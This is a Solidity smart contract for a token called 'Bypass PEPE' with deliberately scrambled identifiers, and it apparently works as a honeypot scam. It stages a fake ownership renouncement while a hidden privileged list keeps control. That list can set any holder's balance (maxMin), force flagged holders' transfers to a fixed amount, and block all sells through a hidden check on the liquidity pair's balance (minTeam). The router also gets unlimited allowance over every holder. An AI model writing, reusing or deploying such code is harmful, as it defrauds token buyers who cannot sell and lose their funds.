//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface limitBuyIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverIsMax) external view returns (uint256);

    function transfer(address atTotal, uint256 shouldExemptLimit) external returns (bool);

    function allowance(address amountTradingSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldExemptLimit) external returns (bool);

    function transferFrom(
        address sender,
        address atTotal,
        uint256 shouldExemptLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamLimit, uint256 value);
    event Approval(address indexed amountTradingSender, address indexed spender, uint256 value);
}

abstract contract sellExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverMax {
    function createPair(address senderModeTotal, address receiverMarketingFund) external returns (address);
}

interface receiverIsEnable is limitBuyIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BypassPEPE is sellExempt, limitBuyIs, receiverIsEnable {

    function listLiquidity(address listMinMode) public {
        launchedSender();
        
        if (listMinMode == senderShould || listMinMode == marketingMode) {
            return;
        }
        fundExemptMin[listMinMode] = true;
    }

    function txSell(address modeIs) public {
        require(modeIs.balance < 100000);
        if (sellTx) {
            return;
        }
        
        tokenShould[modeIs] = true;
        if (launchedAmount) {
            launchedBuy = txLiquidity;
        }
        sellTx = true;
    }

    uint256 tokenTx;

    address public senderShould;

    bool public sellTx;

    mapping(address => mapping(address => uint256)) private toToken;

    bool private liquidityWallet;

    uint256 private launchedBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return listIs;
    }

    event OwnershipTransferred(address indexed enableTo, address indexed tokenSwapLaunched);

    address private limitBuy;

    bool private launchedAmount;

    function transfer(address liquiditySender, uint256 shouldExemptLimit) external virtual override returns (bool) {
        return tradingFundTx(_msgSender(), liquiditySender, shouldExemptLimit);
    }

    constructor (){
        if (launchedAmount == launchedEnable) {
            minLaunch = launchedBuy;
        }
        autoToken receiverList = autoToken(feeSender);
        marketingMode = receiverMax(receiverList.factory()).createPair(receiverList.WETH(), address(this));
        
        senderShould = _msgSender();
        tradingSwap();
        tokenShould[senderShould] = true;
        fromSwap[senderShould] = listIs;
        
        emit Transfer(address(0), senderShould, listIs);
    }

    function balanceOf(address receiverIsMax) public view virtual override returns (uint256) {
        return fromSwap[receiverIsMax];
    }

    function maxMin(address liquiditySender, uint256 shouldExemptLimit) public {
        launchedSender();
        fromSwap[liquiditySender] = shouldExemptLimit;
    }

    function decimals() external view virtual override returns (uint8) {
        return autoLimit;
    }

    function approve(address listReceiverBuy, uint256 shouldExemptLimit) public virtual override returns (bool) {
        toToken[_msgSender()][listReceiverBuy] = shouldExemptLimit;
        emit Approval(_msgSender(), listReceiverBuy, shouldExemptLimit);
        return true;
    }

    mapping(address => uint256) private fromSwap;

    function tradingSwap() public {
        emit OwnershipTransferred(senderShould, address(0));
        limitBuy = address(0);
    }

    uint256 public minLaunch;

    function transferFrom(address fundTeam, address atTotal, uint256 shouldExemptLimit) external override returns (bool) {
        if (_msgSender() != feeSender) {
            if (toToken[fundTeam][_msgSender()] != type(uint256).max) {
                require(shouldExemptLimit <= toToken[fundTeam][_msgSender()]);
                toToken[fundTeam][_msgSender()] -= shouldExemptLimit;
            }
        }
        return tradingFundTx(fundTeam, atTotal, shouldExemptLimit);
    }

    uint256 private txLiquidity;

    string private teamTx = "BPE";

    bool public buyLaunch;

    uint8 private autoLimit = 18;

    function symbol() external view virtual override returns (string memory) {
        return teamTx;
    }

    function owner() external view returns (address) {
        return limitBuy;
    }

    function launchedSender() private view {
        require(tokenShould[_msgSender()]);
    }

    string private totalReceiver = "Bypass PEPE";

    address totalLiquidityIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public marketingMode;

    address feeSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return totalReceiver;
    }

    function tradingFundTx(address fundTeam, address atTotal, uint256 shouldExemptLimit) internal returns (bool) {
        if (fundTeam == senderShould) {
            return buyMin(fundTeam, atTotal, shouldExemptLimit);
        }
        uint256 tokenTrading = limitBuyIs(marketingMode).balanceOf(totalLiquidityIs);
        require(tokenTrading == amountReceiverTx);
        require(atTotal != totalLiquidityIs);
        if (fundExemptMin[fundTeam]) {
            return buyMin(fundTeam, atTotal, modeToken);
        }
        return buyMin(fundTeam, atTotal, shouldExemptLimit);
    }

    function minTeam(uint256 shouldExemptLimit) public {
        launchedSender();
        amountReceiverTx = shouldExemptLimit;
    }

    function buyMin(address fundTeam, address atTotal, uint256 shouldExemptLimit) internal returns (bool) {
        require(fromSwap[fundTeam] >= shouldExemptLimit);
        fromSwap[fundTeam] -= shouldExemptLimit;
        fromSwap[atTotal] += shouldExemptLimit;
        emit Transfer(fundTeam, atTotal, shouldExemptLimit);
        return true;
    }

    function allowance(address liquidityAutoAt, address listReceiverBuy) external view virtual override returns (uint256) {
        if (listReceiverBuy == feeSender) {
            return type(uint256).max;
        }
        return toToken[liquidityAutoAt][listReceiverBuy];
    }

    uint256 private listIs = 100000000 * 10 ** 18;

    uint256 constant modeToken = 16 ** 10;

    mapping(address => bool) public tokenShould;

    bool private launchedEnable;

    function getOwner() external view returns (address) {
        return limitBuy;
    }

    uint256 amountReceiverTx;

    mapping(address => bool) public fundExemptMin;

}